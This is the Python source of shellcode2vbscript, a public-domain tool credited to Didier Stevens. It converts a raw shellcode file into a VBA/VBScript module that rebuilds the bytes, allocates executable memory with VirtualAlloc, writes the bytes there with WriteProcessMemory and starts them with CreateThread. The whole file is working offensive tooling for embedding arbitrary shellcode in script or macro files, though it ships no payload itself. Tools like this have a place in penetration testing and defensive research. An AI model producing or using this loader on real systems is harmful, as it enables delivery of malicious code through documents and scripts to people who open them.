#!/usr/bin/python

"""shellcode2vbscript V0.1

tool to create a VBScript containing shellcode to execute

Source code put in public domain by Didier Stevens, no Copyright
https://DidierStevens.com
Use at your own risk

History:
  2008/11/22: V0.1 forked from file2vbscript

"""

import optparse

def Main():
    """Create a VBScript containing shellcode to execute
    """
    
    parser = optparse.OptionParser(usage='usage: %prog [options] infile outfile.vbs', version='%prog 0.1')
    (options, args) = parser.parse_args()
    
    if len(args) != 2:
        parser.print_help()
        print ''
        print '  Use this program to generate a VBscript containing shellcode to execute'
        print '  Source code put in the public domain by Didier Stevens, no Copyright'
        print '  Use at your own risk'
        print '  https://DidierStevens.com'
    
    else:
        infile = open(args[0], 'rb')
        outfile = open(args[1], 'w')
    
        print >> outfile, 'Private Declare Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long'
        print >> outfile, 'Private Declare Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As Long, ByVal lpAddress As Long, ByVal lpBuffer As String, ByVal dwSize As Long, ByRef lpNumberOfBytesWritten As Long) As Integer'
        print >> outfile, 'Private Declare Function CreateThread Lib "KERNEL32" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, ByVal lpParameter As Long, ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As Long'
        print >> outfile, ''
        print >> outfile, 'Const MEM_COMMIT = &H1000'
        print >> outfile, 'Const PAGE_EXECUTE_READWRITE = &H40'
        print >> outfile, ''

        print >> outfile, 'Private Sub ExecuteShellCode()'
        print >> outfile, '\tDim lpMemory As Long'
        print >> outfile, '\tDim sShellCode As String'
        print >> outfile, '\tDim lResult As Long'
        print >> outfile, ''
        print >> outfile, '\tsShellCode = ShellCode()'
        print >> outfile, '\tlpMemory = VirtualAlloc(0&, Len(sShellCode), MEM_COMMIT, PAGE_EXECUTE_READWRITE)'
        print >> outfile, '\tlResult = WriteProcessMemory(-1&, lpMemory, sShellCode, Len(sShellCode), 0&)'
        print >> outfile, '\tlResult = CreateThread(0&, 0&, lpMemory, 0&, 0&, 0&)'
        print >> outfile, 'End Sub'
        print >> outfile, ''

        countLine = 0
        countSubs = 1
        line = ''
        
        print >> outfile, 'Private Function ParseBytes(strBytes) As String'
        print >> outfile, '\tDim aNumbers'
        print >> outfile, '\tDim sShellCode As String'
        print >> outfile, '\tDim iIter'
        print >> outfile, ''
        print >> outfile, '\tsShellCode = ""'
        print >> outfile, '\taNumbers = split(strBytes)'
        print >> outfile, '\tfor iIter = lbound(aNumbers) to ubound(aNumbers)'
        print >> outfile, '\t\tsShellCode = sShellCode + Chr(aNumbers(iIter))'
        print >> outfile, '\tnext'
        print >> outfile, ''
        print >> outfile, '\tParseBytes = sShellCode'
        print >> outfile, 'End Function'
        print >> outfile, ''

        print >> outfile, 'Private Function ShellCode%d() As String' % countSubs
        print >> outfile, '\tDim sShellCode As String'
        print >> outfile, ''
        print >> outfile, '\tsShellCode = ""'
            
        while True:
            inbyte = infile.read(1)
            if not inbyte:
                break
            if len(line) > 0:
                line = line + ' '
            line = line + '%d' % ord(inbyte)
            if len(line) > 80:
                print >> outfile, '\tsShellCode = sShellCode + ParseBytes("%s")' % line
                line = ''
                countLine += 1
                if countLine > 99:
                    countLine = 0
                    print >> outfile, ''
                    print >> outfile, '\tShellCode%d = sShellCode' % countSubs
                    print >> outfile, 'End Function'
                    print >> outfile, ''
                    countSubs += 1
                    print >> outfile, 'Private Function ShellCode%d() As String' % countSubs
                    print >> outfile, '\tDim sShellCode As String'
                    print >> outfile, ''
                    print >> outfile, '\tsShellCode = ""'
    
        if len(line) > 0:
            print >> outfile, '\tsShellCode = sShellCode + ParseBytes("%s")' % line
            
        print >> outfile, ''
        print >> outfile, '\tShellCode%d = sShellCode' % countSubs
        print >> outfile, 'End Function'
        print >> outfile, ''

        print >> outfile, 'Private Function ShellCode() As String'
        print >> outfile, '\tDim sShellCode As String'
        print >> outfile, ''
        print >> outfile, '\tsShellCode = ""'
        for iIter in range(1, countSubs+1):
            print >> outfile, '\tsShellCode = sShellCode + ShellCode%d()' % iIter
        print >> outfile, ''
        print >> outfile, '\tShellCode = sShellCode'
        print >> outfile, 'End Function'

        infile.close()
        outfile.close()

if __name__ == '__main__':
    Main()
